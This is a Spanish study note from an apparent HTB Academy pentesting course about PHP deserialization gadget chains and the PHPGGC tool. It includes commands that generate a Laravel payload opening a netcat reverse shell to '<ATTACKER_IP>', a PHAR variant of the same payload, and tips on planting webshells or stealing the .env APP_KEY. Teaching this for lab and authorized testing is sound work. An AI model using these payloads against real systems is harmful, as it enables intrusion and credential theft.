---
tags:
  - Web/Red-Team
  - Deserializacion
  - Pentesting/Explotacion
Descripción: "Qué es una cadena de gadgets, cuándo hace falta frente a un magic method directo, y cómo PHPGGC la genera para frameworks PHP comunes"
Fecha de actualización: 2026-11-20
Nota previa: "[[06 - Deserialización PHAR - sinks que no parecen sinks]]"
Nota siguiente: "[[08 - Python - pickle y su máquina virtual]]"
Area: "[[Deserialización.base|Deserialización]]"
---
---

En el laboratorio, la clase que se deserializa trae un `__wakeup` con un `shell_exec`: RCE de regalo. En código real eso casi nunca pasa. <mark style="background: #ADCCFFA6;">Una **cadena de `gadgets`** es la respuesta a «el `sink` deserializa, pero ninguna clase accesible tiene un hook directamente explotable»</mark>: se encadenan los `magic methods` de varias clases ajenas —del framework y de `vendor/`— de modo que la reconstrucción del objeto dispare una secuencia de llamadas que acabe en una función peligrosa.

# La idea de gadget

Un `gadget` es un fragmento de código que ya existe en la aplicación y que el atacante no escribió, pero puede activar. La deserialización encadena `gadgets` igual que un `ROP chain` encadena fragmentos de código máquina: cada `magic method` que se dispara llama a un método de otro objeto, que dispara otro `magic method`, y así hasta el **`kick-off gadget`** (el hook que arranca, típicamente `__destruct` o `__wakeup`) pasando por `gadgets` intermedios hasta el **`sink gadget`** (el que ejecuta: una llamada a `system`, `file_put_contents`, `call_user_func`...).

<mark style="background: #8000E1A6;">La clave operativa: el atacante no necesita que exista código vulnerable, solo que existan las piezas adecuadas en el `classpath`</mark>. Frameworks grandes como Laravel, Symfony o Monolog traen tantas clases que casi siempre hay una combinación que llega a un `sink`. Por eso la explotación empieza por identificar qué framework y qué versión corre el objetivo.

# PHPGGC

Construir una cadena a mano es un ejercicio de ingeniería inversa del `vendor/` que queda fuera del alcance de la mayoría de `engagements`. **PHPGGC** (`PHP Generic Gadget Chains`), de Ambionics, es la colección mantenida de cadenas ya descubiertas para los frameworks comunes, con un generador de `payloads`. Es el equivalente de `ysoserial` en Java.

```shell-session
$ git clone https://github.com/ambionics/phpggc.git
$ cd phpggc
$ ./phpggc -l Laravel

Laravel/RCE1    5.4.27                RCE (Function call)  __destruct
Laravel/RCE9    5.4.0 <= 9.1.8+       RCE (Function call)  __destruct
...
```

Cada fila es una cadena con su rango de versiones, el tipo y el `gadget` de arranque. <mark style="background: #FFB8EBA6;">La columna de versión es lo que hay que cruzar con el fingerprint del objetivo</mark>: `HTBank` corre Laravel `8.83.25`, que cae dentro de `Laravel/RCE9` (`5.4.0 <= 9.1.8+`).

El tipo `RCE (Function call)` significa que la cadena llama a una función PHP que se le indique, con sus argumentos. Para una reverse shell se pide `system` con el comando:

```shell-session
$ ./phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b
Tzo0MDoiSWxsdW1pbmF0ZVxC...SNIP...
```

El `-b` da salida en Base64, lista para pegar en el campo que llega al `sink`. Se importa en la aplicación, la cadena se dispara al deserializar y vuelve la `shell`.

> [!warning]+ El payload de PHPGGC puede dar 500 y aun así funcionar
> La cadena de `gadgets` no reconstruye un objeto `UserSettings` válido —reconstruye una maraña de clases del framework cuyo único fin es llegar al `sink`. La aplicación, tras ejecutar el comando, intenta usar el objeto como si fuera `UserSettings`, falla y devuelve `500: Server Error`. **El error es posterior a la ejecución del comando**: la `shell` ya salió. Confundir el 500 con un fallo del `payload` es un error común; verificar siempre el listener antes de descartar.

# Combinando con PHAR

PHPGGC genera también el archivo PHAR completo con la cadena en los metadatos, lo que fusiona esta técnica con la de [[06 - Deserialización PHAR - sinks que no parecen sinks]]:

```shell-session
$ ./phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.phar
```

Esto es lo que HTB llama «PHARGGC», originalmente un fork de @s_n_t presentado en Black Hat USA 2018 y después integrado en PHPGGC. El resultado se sube como fichero y se dispara con un `phar://`, sin depender de ningún `unserialize` explícito ni de ningún `magic method` vulnerable de la aplicación.

# Más allá de RCE

PHPGGC no solo hace RCE. Los tipos de cadena incluyen:

| Tipo | Qué consigue |
| --- | --- |
| `RCE (Function call)` | Llama a una función PHP arbitraria |
| `RCE (PHP code)` | Ejecuta código PHP arbitrario |
| `File write` | Escribe un fichero en el servidor (webshell, cron, clave SSH) |
| `File read` | Lee un fichero arbitrario (exfiltración de `.env`, config) |
| `SQL injection` | Dispara una query |

<mark style="background: #FFB86CA6;">`File write` y `File read` son a menudo mejores que RCE directa en entornos endurecidos</mark>: un `File write` que deja una webshell en el `webroot`, o un `File read` que saca el `APP_KEY` de `.env` para después forjar cookies cifradas, evaden defensas que vigilan la ejecución de procesos hijos pero no la escritura de ficheros.

> [!important]+ Fingerprint del framework antes que nada
> Toda esta técnica depende de acertar framework y versión. Señales: cookies con nombres característicos (`laravel_session`, `XSRF-TOKEN`), cabeceras, rutas de error, el `favicon`, ficheros expuestos (`composer.lock` da versiones exactas de todas las dependencias). `./phpggc -i Laravel/RCE9` muestra la información de una cadena concreta, incluyendo qué dependencias necesita en el `classpath`. Sin el `classpath` adecuado, la cadena no dispara aunque la versión del framework encaje.

A noviembre de 2026 PHPGGC trae unas **170 cadenas de `gadgets`** sobre **44 frameworks y librerías** (Laravel, Symfony, Monolog, Guzzle, Drupal, Magento, WordPress, Doctrine, TCPDF, ThinkPHP, Yii…), repartidas en RCE (~90), file write/delete, file read, SSRF, SQLi y XXE. Lo mantiene Ambionics; **no publica releases numeradas** —se referencia por commit, no por «versión vX.Y»—. El resto del `tooling` y su estado, en [[14 - Arsenal de herramientas de deserialización]].

> [!info]+ Fuentes
> Herramienta y colección de cadenas: [PHPGGC (Ambionics)](https://github.com/ambionics/phpggc). PHARGGC: [charla de Sam Thomas, Black Hat USA 2018](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf). Concepto de cadena de `gadgets` análogo al de [[00 - Clases de vulnerabilidad en un servicio de red|corrupción de memoria y ROP]]. Caso Laravel del módulo 169 de HTB Academy.
